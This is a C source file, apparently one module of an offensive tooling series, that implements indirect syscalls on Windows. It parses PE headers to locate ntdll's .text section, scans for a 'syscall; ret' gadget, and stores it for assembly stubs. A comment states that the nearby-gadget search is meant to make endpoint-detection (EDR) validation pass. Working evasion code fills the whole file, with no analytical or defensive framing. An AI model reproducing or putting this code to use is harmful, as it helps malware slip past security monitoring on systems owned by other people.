/*
 * BM-T1004: Indirect Syscalls — C Implementation
 *
 * Gadget discovery and initialization logic. The actual syscall stubs
 * are in indirect_syscalls_asm.s (pure assembly for precise control
 * over register and stack layout).
 *
 * Dependencies: BM-T1002 (moonwalk.h) for module discovery (caller's job)
 *               BM-T1001 (loader.h) for resolve_addr (hash-based EAT resolution)
 *               BM-T1003 (syscalls.h) for extract_ssn
 */

#include "indirect_syscalls.h"
#include "loader.h"
#include "syscalls.h"

/* ========================================================================
 * PE Parsing Helpers (inline, no imports)
 * ======================================================================== */

/* Navigate PE headers to find .text section boundaries */
static int get_text_section(void *module_base, void **text_start, size_t *text_size)
{
    unsigned char *base = (unsigned char *)module_base;

    /* DOS header: e_lfanew at offset 0x3C */
    LONG e_lfanew = *(LONG *)(base + 0x3C);
    if (e_lfanew < 0 || e_lfanew > 0x1000)
        return -1;

    unsigned char *nt = base + e_lfanew;

    /* Verify PE signature "PE\0\0" */
    if (*(DWORD *)nt != 0x00004550)
        return -1;

    /* COFF header starts at nt+4 */
    WORD num_sections    = *(WORD *)(nt + 6);
    WORD opt_hdr_size    = *(WORD *)(nt + 20);

    /* Section headers follow optional header */
    unsigned char *sections = nt + 24 + opt_hdr_size;

    for (WORD i = 0; i < num_sections; i++) {
        unsigned char *sec = sections + (i * 40);
        /* Section name is first 8 bytes; .text = 2E 74 65 78 74 */
        if (sec[0] == '.' && sec[1] == 't' && sec[2] == 'e' &&
            sec[3] == 'x' && sec[4] == 't') {
            DWORD virt_size = *(DWORD *)(sec + 8);
            DWORD virt_addr = *(DWORD *)(sec + 12);
            *text_start = base + virt_addr;
            *text_size  = virt_size;
            return 0;
        }
    }

    return -1; /* .text not found */
}

/* ========================================================================
 * Gadget Discovery
 * ======================================================================== */

/*
 * Scan the .text section of a PE module for the byte pattern:
 *   0F 05    syscall
 *   C3       ret
 *
 * Returns the address of the 0F byte (the syscall instruction itself).
 */
void *find_syscall_gadget(void *module_base)
{
    void *text_start = NULL;
    size_t text_size = 0;

    if (get_text_section(module_base, &text_start, &text_size) != 0)
        return NULL;

    unsigned char *p   = (unsigned char *)text_start;
    unsigned char *end = p + text_size - 2; /* need at least 3 bytes */

    while (p < end) {
        /* syscall = 0F 05, ret = C3 */
        if (p[0] == 0x0F && p[1] == 0x05 && p[2] == 0xC3)
            return (void *)p;
        p++;
    }

    return NULL;
}

/*
 * Find a syscall;ret gadget within +/- range_bytes of a function address.
 * This produces a gadget that is plausibly within the function's own stub,
 * making proximity-based EDR validation pass.
 */
void *find_syscall_gadget_near(void *func_addr, size_t range_bytes)
{
    if (!func_addr || range_bytes == 0)
        return NULL;

    unsigned char *start = (unsigned char *)func_addr;
    unsigned char *end   = start + range_bytes;

    /* Search forward from the function address */
    for (unsigned char *p = start; p < end - 2; p++) {
        if (p[0] == 0x0F && p[1] == 0x05 && p[2] == 0xC3)
            return (void *)p;
    }

    return NULL;
}

/* ========================================================================
 * Initialization (standalone BM-T1004 use)
 *
 * When using through Stargate (BM-T1005), sg_init() handles this.
 * For standalone use: call init_indirect_syscalls() to set up the
 * shared gadget, then use indirect_syscall_N(ssn, ...) directly
 * with SSNs you extract yourself via extract_ssn().
 * ======================================================================== */

int init_indirect_syscalls(void *ntdll_base)
{
    if (!ntdll_base)
        return -1;

    /* Find the syscall;ret gadget in ntdll's .text section */
    g_syscall_gadget = find_syscall_gadget(ntdll_base);
    if (!g_syscall_gadget)
        return -1;

    return 0;
}
